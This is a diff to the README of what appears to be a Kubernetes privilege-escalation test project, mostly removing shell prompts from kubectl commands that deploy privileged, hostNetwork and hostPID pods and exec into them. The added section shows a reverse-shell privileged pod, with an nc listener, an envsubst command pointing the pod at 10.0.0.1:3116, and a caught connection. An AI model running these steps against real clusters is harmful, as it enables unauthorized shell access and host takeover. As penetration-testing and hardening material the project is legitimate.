@@ -118,14 +118,14 @@ HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-a
 ```
 ### Create a cronjob of the hostNetwork Pod
 ```bash
-$ kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
+kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
 ```
 cronjob.batch/hostnetwork-exec-cronjob created
 ```
 ```
 Find the created pod
 ```bash
-$ kubectl get pods | grep cronjob
+kubectl get pods | grep cronjob
 ```
 ```
 NAME                                        READY   STATUS    RESTARTS   AGE
@@ -133,19 +133,19 @@ hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
 ```
 Exec into pod
 ```bash
-$ kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
+kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
 ```
 
 ### Create a deployment of the priv-and-hostpid Pod
 ```bash
-$ kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
+kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
 ```
 ```
 deployment.apps/priv-and-hostpid-exec-deployment created
 ```
 Find the created pod
 ```bash
-$ kubectl get pods | grep deployment
+kubectl get pods | grep deployment
 ```
 ```
 priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
@@ -153,12 +153,12 @@ priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0         
 ```
 Exec into pod
 ```bash
-$ kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
+kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
 ```
 
 ### Create all eight resouce types for the everything-allowed type
 ```bash
-$ find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;
+find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;
 ```
 ```
 cronjob.batch/everything-allowed-exec-cronjob created
@@ -191,6 +191,24 @@ everything-allowed-exec-statefulset-0                 1/1     Running   0       
 everything-allowed-exec-statefulset-1                 1/1     Running   0          42s
 ```
 
+### Create a reverse shell privileged pod
+Set up listener
+```bash
+nc -nvlp 3116
+```
+
+Create pod from local yaml without modifying it by using env variables and envsubst
+```bash
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
+```
+Catch the shell 
+```bash
+nc -nvlp 3116
+```
+```
+Listening on 0.0.0.0 3116
+Connection received on 10.0.0.162 42035
+```
 
 # Contributing
 Have you run into a situation where there was a restritive policy, but you were still able to gain elevated access with only a subset of privileges or capabilites? If so, please consider sharing the yaml and the privesc steps, and we'll add it as a new badPod type. 
